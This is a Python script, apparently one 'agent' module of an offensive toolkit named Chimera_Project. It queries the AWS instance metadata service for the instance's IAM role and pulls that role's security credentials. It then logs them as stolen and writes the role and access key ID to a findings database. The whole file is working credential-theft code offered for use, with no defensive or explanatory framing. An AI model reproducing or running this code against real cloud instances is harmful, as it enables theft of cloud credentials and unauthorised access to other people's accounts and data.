import sys; sys.path.append('/home/dan/Chimera_Project')
import os
import sys
import requests
import logging

# GPS Line
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../')))
from core.db_handler import ChimeraDB

class Cloud_Miner:
    def __init__(self):
        self.agent_id = "84"
        self.name = "Cloud_Miner"
        self.db = ChimeraDB()
        self.metadata_url = "http://169.254.169.254/latest/meta-data/"

    def mine_aws(self):
        """Attempts to pull IAM role security credentials from the metadata service."""
        try:
            # First, find the role name
            role_resp = requests.get(self.metadata_url + "iam/security-credentials/", timeout=2)
            if role_resp.status_code == 200:
                role_name = role_resp.text.strip()
                
                # Now, get the actual keys
                creds_resp = requests.get(self.metadata_url + f"iam/security-credentials/{role_name}")
                creds = creds_resp.json()
                
                self.logger.warning(f"[!!!] CLOUD ESCALATION: Stole credentials for role: {role_name}")
                self.db.report_finding(self.name, "Cloud_IAM_Credentials_Stolen", {
                    "role": role_name,
                    "access_key": creds.get('AccessKeyId'),
                    "token_expiry": creds.get('Expiration')
                })
        except Exception:
            self.logger.info("Instance does not appear to be in AWS or IMDS is restricted.")

    def run(self):
        log_path = f"/home/dan/Chimera_Project/logs/{self.name}.log"
        logging.basicConfig(filename=log_path, level=logging.INFO)
        self.logger = logging.getLogger(self.name)
        
        self.db.heartbeat(self.name)
        self.mine_aws()
        self.db.close()

if __name__ == "__main__":
    agent = Cloud_Miner()
    agent.run()
